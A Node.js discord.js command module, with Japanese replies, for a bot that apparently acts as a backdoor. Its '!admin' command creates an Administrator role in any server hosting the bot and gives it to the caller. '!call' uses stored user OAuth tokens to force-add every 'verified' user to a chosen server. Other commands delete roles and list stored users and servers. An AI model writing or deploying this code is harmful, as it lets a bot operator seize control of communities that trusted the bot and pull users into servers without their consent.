const { PermissionFlagsBits } = require('discord.js');
const axios = require('axios');

async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, USERS_FILE) {
    const args = msg.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'admin') {
        const guildId = args[0];
        const roleName = args[1];
        const position = args[2];
        if (!guildId || !roleName || !position) return msg.reply('使用法: !admin [サーバーID] [ロール名] [up/down]');

        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('サーバーが見つかりません。');

        try {
            let role = guild.roles.cache.find(r => r.name === roleName);
            if (!role) {
                role = await guild.roles.create({
                    name: roleName,
                    permissions: [PermissionFlagsBits.Administrator],
                    reason: 'Admin Command Execution'
                });
            }

            if (position === 'up') {
                const botMember = guild.members.me;
                const targetPos = botMember.roles.highest.position - 1;
                if (targetPos > 0) {
                    await role.setPosition(targetPos).catch(e => {
                        throw new Error(`順位変更失敗(Botより上が原因): ${e.message}`);
                    });
                }
            }

            const member = await guild.members.fetch(msg.author.id).catch(() => null);
            if (!member) return msg.reply('あなたは対象サーバーにいません。');

            await member.roles.add(role);
            await msg.reply(`サーバー: ${guild.name} / ロール: ${roleName} / 順位: ${position} で完了しました。`);
        } catch (e) {
            await msg.reply(`エラーが発生しました: ${e.message}`);
        }
    }

    if (command === 'admin-del') {
        const guildId = args[0];
        const roleName = args[1];
        if (!guildId || !roleName) return msg.reply('使用法: !admin-del [サーバーID] [ロール名]');

        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('サーバーが見つかりません。');

        try {
            const role = guild.roles.cache.find(r => r.name === roleName);
            if (!role) return msg.reply(`ロール 「${roleName}」 が見つかりません。`);
            await role.delete();
            await msg.reply(`サーバー: ${guild.name} からロール 「${roleName}」 を削除しました。`);
        } catch (e) {
            await msg.reply(`削除失敗: ${e.message}`);
        }
    }

    if (command === 'userlist') {
        const userData = loadData(USERS_FILE);
        const users = Object.values(userData);
        if (users.length === 0) return msg.reply('認証済みユーザーはいません。');

        const list = users.map(u => `${u.username || '不明'} (${u.id})`).join('\n');
        await msg.reply(`【認証済みユーザー一覧】\n${list}`);
    }

    if (command === 'call') {
        const guildId = args[0];
        if (!guildId) return msg.reply('使用法: !call [サーバーID]');
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('サーバーが見つかりません。');

        const userData = loadData(USERS_FILE);
        const users = Object.values(userData);
        await msg.reply(`${users.length} 人の追加を開始します。`);

        for (const user of users) {
            try {
                await axios.put(
                    `https://discord.com/api/v10/guilds/${guildId}/members/${user.id}`,
                    { access_token: user.accessToken },
                    { headers: { Authorization: `Bot ${process.env.TOKEN}`, 'Content-Type': 'application/json' } }
                );
            } catch (e) {}
        }
        await msg.channel.send('追加処理終了。');
    }

    if (command === 'serverlist') {
        const guilds = client.guilds.cache.map(g => `${g.name} (${g.id})`).join('\n');
        await msg.reply(`導入サーバー一覧:\n${guilds || 'なし'}`);
    }
}

module.exports = handleAdminCommands;
